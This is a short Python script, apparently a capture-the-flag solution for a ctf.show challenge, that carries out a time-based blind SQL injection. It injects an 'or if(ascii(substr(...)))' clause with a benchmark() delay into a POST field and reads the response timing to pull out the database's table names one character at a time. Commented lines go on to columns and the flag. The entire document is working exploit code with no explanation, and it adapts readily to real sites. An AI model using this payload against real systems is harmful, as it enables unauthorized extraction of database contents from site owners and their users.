# author:yu22x
import requests
import time
import string

str = string.digits + string.ascii_lowercase + "{-}"
url = 'http://6ee24480-e6ca-47eb-9eee-4016cf012764.challenge.ctf.show/api/'
flag = ''

for i in range(1, 100):
    # print(i)
    for j in range(32, 126):
        # 表名
        payload = "select group_concat(table_name) from information_schema.tables where table_schema=database()"
        # payload = 'select group_concat(column_name) from information_schema.columns where table_name="ctfshow_flagxccb"'
        # payload = 'select group_concat(flagaabc) from ctfshow_flagxccb'
        data = {
            'ip': f"1) or if(ascii(substr(({payload}), {i}, 1))={j},benchmark(10000000,md5(1)), 1",
            'debug': 0
        }
        # print(data)
        # print(url + payload)
        try:
            res = requests.post(url, data=data, timeout=1)
            time.sleep(1)
        except Exception as e:
            flag += chr(j)
            print(flag)
            time.sleep(5)
            break
